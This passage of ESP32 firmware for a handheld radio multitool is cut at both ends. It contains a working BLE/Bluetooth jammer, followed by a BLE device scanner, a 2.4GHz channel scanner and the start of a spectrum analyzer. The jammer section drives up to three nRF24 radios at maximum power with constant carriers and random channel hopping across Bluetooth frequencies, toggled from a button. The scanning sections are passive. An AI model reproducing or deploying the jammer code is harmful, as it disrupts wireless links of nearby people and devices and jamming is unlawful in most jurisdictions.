    Index = MAX_LINES - 1;
  }

  Buffer[Index] = text;
  Buffercolor[Index] = color;
  Index++;

  if (extraSpace && Index < MAX_LINES) {
    Buffer[Index] = "";
    Buffercolor[Index] = SHREDDY_TEAL;
    Index++;
  }

  for (int i = 3; i < Index; i++) {
    int yPos = i * LINE_HEIGHT + 15;

    tft.fillRect(5, yPos, tft.width() - 10, LINE_HEIGHT, TFT_BLACK);

    tft.setTextColor(Buffercolor[i], TFT_BLACK);
    tft.setCursor(5, yPos);
    tft.print(Buffer[i]);
  }
}

void checkButtons() {
  unsigned long currentTime = millis();

  if (pcf.digitalRead(BTN_UP) == LOW && currentTime - lastButtonPressTime > debounceDelay) {
    jammerToggleRequested = true;
    lastButtonPressTime = currentTime;
  }

  if (pcf.digitalRead(BTN_RIGHT) == LOW && currentTime - lastButtonPressTime > debounceDelay) {
    modeChangeRequested = true;
    lastButtonPressTime = currentTime;
  }

  if (pcf.digitalRead(BTN_LEFT) == LOW && currentTime - lastButtonPressTime > debounceDelay) {
    modeChangeRequested = true;
    lastButtonPressTime = currentTime;
  }
}

void configureRadio(RF24 &radio, const byte* channels, size_t size) {
  radio.setAutoAck(false);
  radio.stopListening();
  radio.setRetries(0, 0);
  radio.setPALevel(RF24_PA_MAX, true);
  radio.setDataRate(RF24_2MBPS);
  radio.setCRCLength(RF24_CRC_DISABLED);
  radio.printPrettyDetails();

  for (size_t i = 0; i < size; i++) {
    radio.setChannel(channels[i]);
    radio.startConstCarrier(RF24_PA_MAX, channels[i]);
  }
}

void initializeRadiosMultiMode() {
  bool radio1Active = false;
  bool radio2Active = false;
  bool radio3Active = false;

  if (radio1.begin()) {
    configureRadio(radio1, channelGroup1, sizeof(channelGroup1));
    radio1Active = true;
  }
  if (radio2.begin()) {
    configureRadio(radio2, channelGroup2, sizeof(channelGroup2));
    radio2Active = true;
  }
  if (radio3.begin()) {
    configureRadio(radio3, channelGroup3, sizeof(channelGroup3));
    radio3Active = true;
  }
}

void initializeRadios() {
  if (jammerActive) {
    initializeRadiosMultiMode();

  } else {
    radio1.powerDown();
    radio2.powerDown();
    radio3.powerDown();
  }
}

void updateTFT() {
  static bool previousJammerState = false;
  static bool prevNRF1State = false;
  static bool prevNRF2State = false;
  static int previousMode = -1;

  tft.fillRect(0, 39, 240, 320, TFT_BLACK);
  tft.fillRect(0, 19, 240, 16, DARK_GRAY);

  tft.setTextSize(1);
  tft.setTextColor(WHITE, DARK_GRAY);

  struct ButtonGuide {
    const char* label;
    const unsigned char* icon;
  };

  ButtonGuide buttons[] = {
    {jammerActive ? "[ON]" : "[OFF]", bitmap_icon_UP},
    {"MODE-", bitmap_icon_LEFT},
    {"MODE+", bitmap_icon_RIGHT}
  };

  int xPos = 20;
  int yPosIcon = 19;
  int spacing = 75;

  for (int i = 0; i < 3; i++) {
    tft.drawBitmap(xPos, yPosIcon, buttons[i].icon, 16, 16, SHREDDY_TEAL);

    tft.setCursor(xPos + 18, yPosIcon + 4);
    tft.print(buttons[i].label);

    if (i < 2) {
      int sepX = xPos + spacing - 8;
      tft.drawFastVLine(sepX, 22, 12, LIGHT_GRAY);
    }

    xPos += spacing;
  }

  tft.drawRoundRect(0, 19, 240, 16, 4, LIGHT_GRAY);
}

void checkModeChange() {
  checkButtons();

  if (modeChangeRequested) {
    modeChangeRequested = false;
    currentMode = static_cast<OperationMode>((currentMode + 1) % 2);
    initializeRadios();
    updateTFT();

    String modeText = "[+] Mode changed to: ";
    modeText += (currentMode == BLE_MODULE) ? "BLE" : "Bluetooth";
    Print(modeText, SHREDDY_TEAL, false);
  }

  if (jammerToggleRequested) {
    jammerToggleRequested = false;
    jammerActive = !jammerActive;
    initializeRadios();
    updateTFT();

    String jammerText = "[!] Jammer ";
    jammerText += (jammerActive) ? "Activated" : "Deactivated";
    Print(jammerText, jammerActive ? TFT_RED : TFT_RED, false);
  }
}

void blejamSetup() {

  tft.fillScreen(TFT_BLACK);
  tft.setRotation(0);

  setupTouchscreen();

  float currentBatteryVoltage = readBatteryVoltage();
  drawStatusBar(currentBatteryVoltage, false);
  updateTFT();

  Print("===== System Diagnostics =====", TFT_CYAN, false);
  Print("Initializing TFT display...", SHREDDY_TEAL, false);

  initializeRadios();

  Print("[*] Disabling Bluetooth & WiFi...", SHREDDY_TEAL, false);
  Print("[*] Bluetooth & WiFi disabled.", SHREDDY_TEAL, false);

  Print("[*] Initializing PCF8574...", SHREDDY_TEAL, false);

  pcf.pinMode(BTN_UP, INPUT_PULLUP);
  pcf.pinMode(BTN_DOWN, INPUT_PULLUP);
  pcf.pinMode(BTN_LEFT, INPUT_PULLUP);
  pcf.pinMode(BTN_RIGHT, INPUT_PULLUP);
  pcf.pinMode(BTN_SELECT, INPUT_PULLUP);

  Print("[+] System Ready!", TFT_GREEN, true);
}

void blejamLoop() {

  //updateStatusBar();
  checkModeChange();

  if (jammerActive) {
    if (currentMode == BLE_MODULE) {
      int randomIndex = random(0, sizeof(ble_channels) / sizeof(ble_channels[0]));
      int channel = ble_channels[randomIndex];
      radio1.setChannel(channel);
      radio2.setChannel(channel);
      radio3.setChannel(channel);

    } else if (currentMode == Bluetooth_MODULE) {
      int randomIndex = random(0, sizeof(bluetooth_channels) / sizeof(bluetooth_channels[0]));
      int channel = bluetooth_channels[randomIndex];
      radio1.setChannel(channel);
      radio2.setChannel(channel);
      radio3.setChannel(channel);
    }
  }
}
}


/*
   BleScan



*/

namespace BleScan {

#define BTN_UP 6
#define BTN_DOWN 3
#define BTN_RIGHT 5
#define BTN_LEFT 4

#define SCREEN_WIDTH  240
#define SCREENHEIGHT 320
#define STATUS_BAR_Y_OFFSET 20
#define STATUS_BAR_HEIGHT 16
#define ICON_SIZE 16
#define ICON_NUM 2

BLEScan* bleScan;
BLEScanResults bleResults;
bool isScanning = false;
bool isDetailView = false;
int currentIndex = 0;
int listStartIndex = 0;
bool screenNeedsUpdate = true;
bool fullScreenUpdate = true;

int yshift = 30;

unsigned long lastButtonPress = 0;
const unsigned long debounceTime = 200;

static bool uiDrawn = false;

static int iconX[ICON_NUM] = {210, 10};
static const unsigned char* icons[ICON_NUM] = {
  bitmap_icon_undo,
  bitmap_icon_go_back // Added back icon
};

void displayScanning() {
  tft.fillRect(0, 37, 240, 320, TFT_BLACK);
  tft.setTextColor(SHREDDY_TEAL, TFT_BLACK);
  tft.setCursor(10, 15 + yshift);
  tft.print("[*] Scanning");

  for (int i = 0; i < 2; i++) {
    for (int j = 0; j <= i; j++) {
      tft.print(".");
      delay(500);
    }
  }
  tft.setCursor(10, 25 + yshift);
  tft.print("[+] Scan complete!");

  delay(100);

  tft.setCursor(10, 45 + yshift);
  tft.print("[+] Wait a moment");
  isScanning = false;
}

void startBLEScan() {
  displayScanning();
  isScanning = true;
  screenNeedsUpdate = true;
  fullScreenUpdate = true;
  bleResults = bleScan->start(5, false);
  isScanning = false;
  screenNeedsUpdate = true;
}

void handleButtons() {
  unsigned long currentMillis = millis();
  if (currentMillis - lastButtonPress < debounceTime) return;

  if (!pcf.digitalRead(BTN_UP)) {
    if (!isDetailView && currentIndex > 0) {
      currentIndex--;
      delay(200);
      if (currentIndex < listStartIndex) listStartIndex--;
      screenNeedsUpdate = true;
      fullScreenUpdate = false;
    }
    lastButtonPress = currentMillis;
  }

  if (!pcf.digitalRead(BTN_DOWN)) {
    if (!isDetailView && currentIndex < bleResults.getCount() - 1) {
      currentIndex++;
      delay(200);
      if (currentIndex >= listStartIndex + 14) listStartIndex++;
      screenNeedsUpdate = true;
      fullScreenUpdate = false;
    }
    lastButtonPress = currentMillis;
  }

  if (!pcf.digitalRead(BTN_RIGHT)) {
    delay(200);
    if (!isScanning) {
      isDetailView = !isDetailView;
      screenNeedsUpdate = true;
      fullScreenUpdate = true;
    }
    lastButtonPress = currentMillis;
  }

  if (!pcf.digitalRead(BTN_LEFT)) {
    delay(200);
    if (isDetailView) {
      isDetailView = false;
      fullScreenUpdate = true;
    } else if (!isScanning) {
      startBLEScan();
      fullScreenUpdate = true;
    }
    screenNeedsUpdate = true;
    lastButtonPress = currentMillis;
  }
}

void updateBLEList() {
  if (fullScreenUpdate) {
    tft.fillRect(0, 37, 240, 320, TFT_BLACK);
    tft.fillRect(35, 20, 105, 16, DARK_GRAY);
    tft.setTextColor(SHREDDY_TEAL);
    tft.setCursor(35, 24);
    tft.print("BLE Devices:");
  }

  int deviceCount = bleResults.getCount();
  if (deviceCount <= 0) {
    if (fullScreenUpdate) {
      tft.fillRect(0, 20, 140, 16, DARK_GRAY);
      tft.setTextColor(SHREDDY_TEAL);
      tft.setCursor(5, 24);
      tft.print("No Devices Found");
    }
    return;
  }

  for (int i = 0; i < 14; i++) {
    int index = i + listStartIndex;
    if (index >= deviceCount) break;

    int yPos = 15 + i * 18;
    tft.fillRect(0, yPos - 2 + yshift, tft.width(), 18, TFT_BLACK);

    BLEAdvertisedDevice device = bleResults.getDevice(index);
    String deviceName = device.getName().length() > 0 ? device.getName().c_str() : "Unknown Device";

    tft.setCursor(10, yPos + yshift);
    if (index == currentIndex) {
      tft.setTextColor(ORANGE, TFT_BLACK);
      tft.print("> " + deviceName);
    } else {
      tft.setTextColor(SHREDDY_TEAL, TFT_BLACK);
      tft.print("  " + deviceName);
    }
  }
}

void displayBLEDetails() {

  tft.fillRect(0, 37, 240, 320, TFT_BLACK);
  tft.fillRect(35, 20, 105, 16, DARK_GRAY);
  tft.setTextColor(SHREDDY_TEAL);
  tft.setCursor(35, 24);
  tft.print("Device Details:");

  BLEAdvertisedDevice device = bleResults.getDevice(currentIndex);
  String deviceName = device.getName().length() > 0 ? device.getName().c_str() : "Unknown Device";
  String address = device.getAddress().toString().c_str();
  int rssi = device.getRSSI();
  int txPower = device.getTXPower();

  tft.setTextColor(SHREDDY_TEAL, TFT_BLACK);
  tft.setTextSize(1);

  tft.setCursor(10, 20 + yshift);
  tft.print("Device: " + deviceName);
  tft.setCursor(10, 40 + yshift);
  tft.print("MAC: " + address);
  tft.setCursor(10, 60 + yshift);
  tft.print("RSSI: " + String(rssi) + " dBm");
  tft.setCursor(10, 80 + yshift);
  tft.print("Tx Power: " + String(txPower) + " dBm");

  if (device.haveServiceUUID()) {
    tft.setCursor(10, 100 + yshift);
    tft.print("Service UUID: " + String(device.getServiceUUID().toString().c_str()));
  } else {
    tft.setCursor(10, 100 + yshift);
    tft.print("No Service UUID");
  }
  if (device.haveManufacturerData()) {
    String manufacturerData = String((char*)device.getManufacturerData().c_str());
    tft.setCursor(10, 120 + yshift);
    tft.print("Manufacturer Data: " + manufacturerData);
  } else {
    tft.setCursor(10, 120 + yshift);
    tft.print("No Manufacturer Data");
  }
  if (device.haveServiceData()) {
    String serviceData = String((char*)device.getServiceData().c_str());
    tft.setCursor(10, 150 + yshift);
    tft.print("Service Data: " + serviceData);
  } else {
    tft.setCursor(10, 150 + yshift);
    tft.print("No Service Data");
  }
}


void runUI() {

  static int iconY = STATUS_BAR_Y_OFFSET;

  if (!uiDrawn) {
    tft.drawLine(0, 19, 240, 19, SHREDDY_TEAL);
    tft.fillRect(140, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH - 140, STATUS_BAR_HEIGHT, DARK_GRAY);

    for (int i = 0; i < ICON_NUM; i++) {
      if (icons[i] != NULL) {
        tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, SHREDDY_TEAL);
      }
    }
    tft.drawLine(0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, SCREEN_WIDTH, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, ORANGE);
    uiDrawn = true;
  }

  static unsigned long lastAnimationTime = 0;
  static int animationState = 0;
  static int activeIcon = -1;

  if (animationState > 0 && millis() - lastAnimationTime >= 150) {
    if (animationState == 1) {
      tft.drawBitmap(iconX[activeIcon], iconY, icons[activeIcon], ICON_SIZE, ICON_SIZE, SHREDDY_TEAL);
      animationState = 2;

      switch (activeIcon) {
        case 0:
          if (!isScanning) {
            startBLEScan();
          }
          break;
        case 1: // Back icon action (exit to submenu)
           feature_exit_requested = true;
          break;
      }
    } else if (animationState == 2) {
      animationState = 0;
      activeIcon = -1;
    }
    lastAnimationTime = millis();
  }

  static unsigned long lastTouchCheck = 0;
  const unsigned long touchCheckInterval = 50;

  if (millis() - lastTouchCheck >= touchCheckInterval) {
    if (ts.touched() && feature_active) {
      TS_Point p = ts.getPoint();
      int x = ::map(p.x, 300, 3800, 0, SCREEN_WIDTH - 1);
      int y = ::map(p.y, 3800, 300, 0, SCREENHEIGHT - 1);

      if (y > STATUS_BAR_Y_OFFSET && y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
        for (int i = 0; i < ICON_NUM; i++) {
          if (x > iconX[i] && x < iconX[i] + ICON_SIZE) {
            if (icons[i] != NULL && animationState == 0) {
              tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_BLACK);
              animationState = 1;
              activeIcon = i;
              lastAnimationTime = millis();
            }
            break;
          }
        }
      }
    }
    lastTouchCheck = millis();
  }
}

void bleScanSetup() {

  tft.setRotation(0);
  tft.fillScreen(TFT_BLACK);
  tft.setTextColor(SHREDDY_TEAL, TFT_BLACK);
  tft.setTextSize(1);
  tft.fillRect(0, 20, 140, 16, DARK_GRAY);

  uiDrawn = false;

  float currentBatteryVoltage = readBatteryVoltage();
  drawStatusBar(currentBatteryVoltage, false);
  runUI();

  setupTouchscreen();

  pcf.pinMode(BTN_UP, INPUT_PULLUP);
  pcf.pinMode(BTN_DOWN, INPUT_PULLUP);
  pcf.pinMode(BTN_RIGHT, INPUT_PULLUP);
  pcf.pinMode(BTN_LEFT, INPUT_PULLUP);

  BLEDevice::init("");
  bleScan = BLEDevice::getScan();
  bleScan->setActiveScan(true);

  startBLEScan();
}

void bleScanLoop() {
  tft.drawLine(0, 19, 240, 19, SHREDDY_TEAL);
  handleButtons();

  updateStatusBar();
  runUI();

  if (screenNeedsUpdate) {
    screenNeedsUpdate = false;
    if (isScanning) {
      displayScanning();
    } else if (!isDetailView) {
      updateBLEList();
    } else {
      displayBLEDetails();
    }
    if (fullScreenUpdate) fullScreenUpdate = false;
  }
}
}


/*
   2.4GHz Scanner



*/

namespace Scanner {

#define CE  16
#define CSN 17
#define BUTTON 27

#define CHANNELS  128
int channel[CHANNELS];

#define N 128
uint8_t values[N];

static bool uiDrawn = false;

#define BTN_SELECT 7

#define _NRF24_CONFIG   0x00
#define _NRF24_EN_AA    0x01
#define _NRF24_RF_CH    0x05
#define _NRF24_RF_SETUP 0x06
#define _NRF24_RPD      0x09

int backgroundNoise[CHANNELS] = {0};

volatile bool scanning = true;

#define SCREEN_HEIGHT 180
#define LINE_HEIGHT 12
#define MAX_LINES (SCREEN_HEIGHT / LINE_HEIGHT)

String Buffer[MAX_LINES];
uint16_t Buffercolor[MAX_LINES];
int Index = 0;

bool isSelectButtonPressed() {
  return pcf.digitalRead(BTN_SELECT) == LOW;  
}

byte getRegister(byte r) {
  byte c;
  digitalWrite(CSN, LOW);
  SPI.transfer(r & 0x1F);
  c = SPI.transfer(0);
  digitalWrite(CSN, HIGH);
  return c;
}

bool carrierDetected() {
  return getRegister(_NRF24_RPD) & 0x01;
}

void setRegister(byte r, byte v) {
  digitalWrite(CSN, LOW);
  SPI.transfer((r & 0x1F) | 0x20);
  SPI.transfer(v);
  digitalWrite(CSN, HIGH);
}

void setChannel(uint8_t channel) {
  setRegister(_NRF24_RF_CH, channel);
}

void powerUp() {
  setRegister(_NRF24_CONFIG, getRegister(_NRF24_CONFIG) | 0x02);
  delayMicroseconds(130);
}

void powerDown() {
  setRegister(_NRF24_CONFIG, getRegister(_NRF24_CONFIG) & ~0x02);
}

void enable() {
  digitalWrite(CE, HIGH);
}

void disable() {
  digitalWrite(CE, LOW);
}

void setRX() {
  setRegister(_NRF24_CONFIG, getRegister(_NRF24_CONFIG) | 0x01);
  enable();
  delayMicroseconds(100);
}


void scroll() {
  for (int i = 3; i < MAX_LINES - 1; i++) {
    Buffer[i] = Buffer[i + 1];
    Buffercolor[i] = Buffercolor[i + 1];
  }
}

void Print(String text, uint16_t color, bool extraSpace = false) {
  if (Index >= MAX_LINES - 1) {
    scroll();
    Index = MAX_LINES - 1;
  }

  Buffer[Index] = text;
  Buffercolor[Index] = color;
  Index++;

  if (extraSpace && Index < MAX_LINES) {
    Buffer[Index] = "";
    Buffercolor[Index] = SHREDDY_TEAL;
    Index++;
  }

  for (int i = 3; i < Index; i++) {
    int yPos = i * LINE_HEIGHT + 15;

    tft.fillRect(5, yPos, tft.width() - 10, LINE_HEIGHT, TFT_BLACK);

    tft.setTextColor(Buffercolor[i], TFT_BLACK);
    tft.setCursor(5, yPos);
    tft.print(Buffer[i]);
  }
}

void calibrateBackgroundNoise() {

  Print("[!] Calibrating background noise", TFT_ORANGE, false);

  for (int i = 0; i < 2; i++) {
    disable();
    for (int j = 0; j < 50; j++) {
      for (int i = 0; i < CHANNELS; i++) {
        setRegister(_NRF24_RF_CH, (128 * i) / CHANNELS);
        setRX();
        delayMicroseconds(50);
        disable();
        if (getRegister(_NRF24_RPD) > 0) channel[i]++;
      }
    }
    Print(".", SHREDDY_TEAL, false);
    for (int j = 0; j < CHANNELS; j++) {
      backgroundNoise[j] += channel[j];

    }
  }

  for (int i = 0; i < CHANNELS; i++) {
    backgroundNoise[i] /= 5;
  }

  Print("[+] Background noise calibration", SHREDDY_TEAL, false);
  Print("[+] done.", SHREDDY_TEAL, false);
}

void scan() {
  Print("[!] Refresh Scanner.", TFT_ORANGE, false);
  disable();
  for (int j = 0; j < 50; j++) {
    for (int i = 0; i < CHANNELS; i++) {
      setRegister(_NRF24_RF_CH, (128 * i) / CHANNELS);
      setRX();
      delayMicroseconds(50);
      disable();
      if (getRegister(_NRF24_RPD) > 0) channel[i]++;
    }
  }
}

void runUI() {
#define SCREEN_WIDTH  240
#define SCREEN_HEIGHT 320
#define STATUS_BAR_Y_OFFSET 20
#define STATUS_BAR_HEIGHT 16
#define ICON_SIZE 16
#define ICON_NUM 3

  static int iconX[ICON_NUM] = {170, 210, 10};
  static int iconY = STATUS_BAR_Y_OFFSET;

  static const unsigned char* icons[ICON_NUM] = {
    bitmap_icon_undo,   
    bitmap_icon_start,
    bitmap_icon_go_back // Added back icon
  };

  if (!uiDrawn) {

    tft.fillRect(0, 20, 160, 16, DARK_GRAY);
    tft.setTextColor(SHREDDY_TEAL);
    tft.setCursor(35, 24);
    tft.print("2.4GHz Scanner");

    tft.drawLine(0, 19, 240, 19, SHREDDY_TEAL);
    tft.fillRect(160, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH, STATUS_BAR_HEIGHT, DARK_GRAY);

    for (int i = 0; i < ICON_NUM; i++) {
      if (icons[i] != NULL) {
        tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, SHREDDY_TEAL);
      }
    }
    tft.drawLine(0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, SCREEN_WIDTH, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, ORANGE);
    uiDrawn = true;
  }

  static unsigned long lastAnimationTime = 0;
  static int animationState = 0;  
  static int activeIcon = -1;

  if (animationState > 0 && millis() - lastAnimationTime >= 150) {
    if (animationState == 1) {
      tft.drawBitmap(iconX[activeIcon], iconY, icons[activeIcon], ICON_SIZE, ICON_SIZE, SHREDDY_TEAL);
      animationState = 2;

      switch (activeIcon) {
        case 0: calibrateBackgroundNoise(); break;
        case 1: scan(); break;
        case 2: feature_exit_requested = true; break;
      }
    } else if (animationState == 2) {
      animationState = 0;
      activeIcon = -1;
    }
    lastAnimationTime = millis();
  }

  static unsigned long lastTouchCheck = 0;
  const unsigned long touchCheckInterval = 50;  

  if (millis() - lastTouchCheck >= touchCheckInterval) {
    if (ts.touched() && feature_active) {
      TS_Point p = ts.getPoint();
      int x = ::map(p.x, 300, 3800, 0, SCREEN_WIDTH - 1);
      int y = ::map(p.y, 3800, 300, 0, SCREENHEIGHT - 1);

      if (y > STATUS_BAR_Y_OFFSET && y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
        for (int i = 0; i < ICON_NUM; i++) {
          if (x > iconX[i] && x < iconX[i] + ICON_SIZE) {
            if (icons[i] != NULL && animationState == 0) {
              tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_BLACK);
              animationState = 1;
              activeIcon = i;
              lastAnimationTime = millis();
            }
            break;
          }
        }
      }
    }
    lastTouchCheck = millis();
  }
}

void scanChannels() {
  disable();
  for (int j = 0; j < 100 && scanning; j++) {
    if (isSelectButtonPressed()) {
      scanning = false;
      Print("Scan interrupted by user", TFT_YELLOW, true);
      return;
    }
    for (int i = 0; i < CHANNELS && scanning; i++) {
      setRegister(_NRF24_RF_CH, (128 * i) / CHANNELS);
      setRX();
      delayMicroseconds(50);
      disable();
      if (getRegister(_NRF24_RPD) > 0) channel[i]++;
      runUI();
    }
  }
}

void outputChannels() {
  int norm = 0;
  for (int i = 0; i < CHANNELS && scanning; i++) {
    if (channel[i] > norm) norm = channel[i];
  }
  for (int i = 0; i < CHANNELS && scanning; i++) {
    if (isSelectButtonPressed()) {
      scanning = false;
      Print("Output interrupted by user", TFT_YELLOW, true);
      return;
    }
    int strength = (norm != 0) ? (channel[i] * 10) / norm : 0;
    channel[i] = 0;
    runUI();
  }
}

void display() {
  runUI();

  // ========== SCANNER GRAPH POSITIONING - MOVED WAY UP ==========
  #define SCANNER_GRAPH_TOP 40       // Top of graph area
  #define SCANNER_GRAPH_BOTTOM 200   // Baseline in MIDDLE of screen (was 280/308)
  #define SCANNER_GRAPH_HEIGHT (SCANNER_GRAPH_BOTTOM - SCANNER_GRAPH_TOP)  // 160 pixels

  memset(values, 0, sizeof(values));

  int scanCycles = 50;
  while (scanCycles-- && scanning) {
    if (isSelectButtonPressed()) {
      scanning = false;
      Print("Display interrupted by user", TFT_YELLOW, true);
      return;
    }
    for (int i = 0; i < N && scanning; ++i) {
      setChannel(i);
      enable();
      delayMicroseconds(128);
      disable();
      if (carrierDetected()) {
        values[i]++;
      }
    }
  }

  if (scanning) {
    // Clear graph area
    tft.fillRect(0, SCANNER_GRAPH_TOP - 10, 240, SCANNER_GRAPH_HEIGHT + 50, TFT_BLACK);

#define CHANNELS 128
#define SCANNER_GRAPH_X 10
#define SCANNER_GRAPH_WIDTH 220

    int barWidth = SCANNER_GRAPH_WIDTH / CHANNELS;  // ~1.7px per channel
    if (barWidth < 1) barWidth = 1;
    int maxBarHeight = SCANNER_GRAPH_HEIGHT - 5;

    // Draw ALL 128 channels continuously - TEAL TO MAGENTA GRADIENT
    for (int i = 0; i < 128; ++i) {
      int x = SCANNER_GRAPH_X + (i * SCANNER_GRAPH_WIDTH / CHANNELS);

      int barHeight = values[i] * 20;  // BOOSTED for max visibility
      if (barHeight < 4 && values[i] > 0) barHeight = 4;  // Minimum visible height
      if (barHeight > maxBarHeight) barHeight = maxBarHeight;

      if (barHeight > 0) {
        // Draw gradient bar - SHREDDY TEAL (#23D2C3) at bottom to PINK (#FF16A0) at top
        for (int y = 0; y < barHeight; y++) {
          float ratio = (float)y / (float)maxBarHeight;

          // Shreddy Teal (35, 210, 195) -> Shreddy Pink (255, 22, 160)
          uint8_t r = 35 + (uint8_t)(ratio * (255 - 35));
          uint8_t g = 210 - (uint8_t)(ratio * (210 - 22));
          uint8_t b = 195 - (uint8_t)(ratio * (195 - 160));

          // Convert to 565 color
          uint16_t color = ((r & 0xF8) << 8) | ((g & 0xFC) << 3) | (b >> 3);

          int drawY = SCANNER_GRAPH_BOTTOM - barHeight + y;
          tft.drawFastHLine(x, drawY, barWidth + 1, color);
        }
      }
    }

    // X-axis labels (channel numbers)
    tft.setTextColor(SHREDDY_TEAL, TFT_BLACK);
    tft.setCursor(10, SCANNER_GRAPH_BOTTOM + 5);
    tft.print("1..5.10..20..40..50..80..90..110..128");

    // Draw axes
    int axisX = 10;
    tft.drawLine(axisX, SCANNER_GRAPH_TOP, axisX, SCANNER_GRAPH_BOTTOM, SHREDDY_TEAL);      // Y-axis
    tft.drawLine(axisX, SCANNER_GRAPH_BOTTOM, 230, SCANNER_GRAPH_BOTTOM, SHREDDY_TEAL);     // X-axis

    // Axis markers
    tft.fillCircle(axisX, SCANNER_GRAPH_BOTTOM, 1, TFT_RED);    // Origin
    tft.fillCircle(axisX, SCANNER_GRAPH_TOP, 1, TFT_RED);       // Y-axis top
    tft.fillCircle(230, SCANNER_GRAPH_BOTTOM, 1, TFT_RED);      // X-axis end

    // Axis labels
    tft.setTextColor(SHREDDY_TEAL);
    tft.setTextSize(1);
    tft.drawString("Y", axisX + 5, SCANNER_GRAPH_TOP);
    tft.drawString("X", 220, SCANNER_GRAPH_BOTTOM - 12);
  }
}

void scannerSetup() {

  tft.setRotation(0);
  tft.fillScreen(TFT_BLACK);

  float currentBatteryVoltage = readBatteryVoltage();
  drawStatusBar(currentBatteryVoltage, false);
  uiDrawn = false;
  display();

  setupTouchscreen();

  // ═══════════════════════════════════════════════════════════════════════════
  // SubGHz Cleanup - Release pin 16 and SPI bus before nRF24 init
  // Pin 16 is shared: CC1101 GDO0/RX (with interrupt) AND nRF24 CE (GPIO output)
  // ONLY cleanup if SubGHz receive was actually enabled (prevents crash)
  // ═══════════════════════════════════════════════════════════════════════════
  if (replayat::subghz_receive_active) {
    replayat::mySwitch.disableReceive();     // Detach interrupt from pin 16
    ELECHOUSE_cc1101.setSidle();             // Put CC1101 in idle mode
    replayat::subghz_receive_active = false; // Reset flag
    Print("[*] SubGHz cleanup - Pin 16 released", TFT_CYAN, false);
  }

  // ALWAYS reset SPI bus and deselect CC1101 before nRF24 init
  SPI.end();                                // Release SPI bus completely
  delay(10);
  pinMode(27, OUTPUT);                      // CC1101 CSN pin
  digitalWrite(27, HIGH);                   // Deselect CC1101
  pinMode(CE, OUTPUT);                      // Reconfigure pin 16 as OUTPUT for nRF24 CE
  digitalWrite(CE, LOW);                    // Start with CE low
  pinMode(CSN, OUTPUT);                     // nRF24 CSN
  digitalWrite(CSN, HIGH);                  // Deselect nRF24 initially

  Print(" ", TFT_GREEN, false);
  Print(" ", TFT_GREEN, false);
  Print(" ", TFT_GREEN, false);
  Print("[*] 2.4GHz Scanner Initialized...", TFT_GREEN, false);

  SPI.begin(18, 19, 23, 17);
  SPI.setDataMode(SPI_MODE0);
  SPI.setFrequency(10000000);
  SPI.setBitOrder(MSBFIRST);

  pinMode(CE, OUTPUT);
  pinMode(CSN, OUTPUT);
  pinMode(BUTTON, INPUT_PULLUP);

  pcf.pinMode(BTN_SELECT, INPUT_PULLUP);

  disable();
  powerUp();
  setRegister(_NRF24_EN_AA, 0x0);
  setRegister(_NRF24_RF_SETUP, 0x0F);

  scanning = true;
}

void scannerLoop() {
  scanning = true;
  while (scanning) {
    if (isSelectButtonPressed()) {
      scanning = false;
      Print("Scanner stopped by user", TFT_YELLOW, true);
      break;
    }
    runUI();
    scanChannels();
    outputChannels();
    display();
    delay(5);  
    }
  }
}


/*
 *
 * 2.4GHz Spectrum Analyzer - Real-time visualization
 *
*/

namespace Analyzer {

#define ANA_CE  16
#define ANA_CSN 17
#define ANA_CHANNELS 128

// Data arrays
uint8_t current_levels[ANA_CHANNELS];
uint8_t peak_levels[ANA_CHANNELS];
unsigned long lastScanTime = 0;
unsigned long lastDisplayTime = 0;
bool analyzerRunning = true;

// WiFi channel positions (NRF24 channel numbers)
// WiFi Ch 1 = 2412 MHz = NRF Ch 12
// WiFi Ch 6 = 2437 MHz = NRF Ch 37
// WiFi Ch 11 = 2462 MHz = NRF Ch 62
const int WIFI_CH1 = 12;
const int WIFI_CH6 = 37;
const int WIFI_CH11 = 62;

// Display constants - GRAPH IN MIDDLE OF SCREEN
#define GRAPH_X 10
#define GRAPH_Y 40          // Start near top
#define GRAPH_WIDTH 220
#define GRAPH_HEIGHT 160    // End at Y=200 (middle of screen)
#define BAR_WIDTH 1

// NRF24 register definitions (same as Scanner)
#define _ANA_NRF24_CONFIG   0x00
#define _ANA_NRF24_EN_AA    0x01
#define _ANA_NRF24_RF_CH    0x05
#define _ANA_NRF24_RF_SETUP 0x06
#define _ANA_NRF24_RPD      0x09

byte anaGetRegister(byte r) {
    byte c;
    digitalWrite(ANA_CSN, LOW);
    SPI.transfer(r & 0x1F);
    c = SPI.transfer(0);
    digitalWrite(ANA_CSN, HIGH);
    return c;
}

void anaSetRegister(byte r, byte v) {
    digitalWrite(ANA_CSN, LOW);
    SPI.transfer((r & 0x1F) | 0x20);
    SPI.transfer(v);
    digitalWrite(ANA_CSN, HIGH);
}

void anaPowerUp() {
    anaSetRegister(_ANA_NRF24_CONFIG, anaGetRegister(_ANA_NRF24_CONFIG) | 0x02);
    delayMicroseconds(130);
}

void anaEnable() {
    digitalWrite(ANA_CE, HIGH);
}

void anaSetRX() {
    anaSetRegister(_ANA_NRF24_CONFIG, anaGetRegister(_ANA_NRF24_CONFIG) | 0x01);
    digitalWrite(ANA_CE, HIGH);
    delayMicroseconds(100);
}

void anaDisable() {
    digitalWrite(ANA_CE, LOW);
}

bool anaCarrierDetected() {
    return anaGetRegister(_ANA_NRF24_RPD) & 0x01;
}

// Get color based on signal level (0-50 typical range)
uint16_t getSignalColor(uint8_t level) {
    if (level == 0) return TFT_DARKGREY;
    if (level < 5) return TFT_BLUE;
    if (level < 15) return TFT_CYAN;
    if (level < 25) return TFT_GREEN;
    if (level < 35) return TFT_YELLOW;
    if (level < 45) return ORANGE;
    return TFT_RED;
}

void drawWiFiMarkers() {
    // Draw vertical lines for WiFi channels
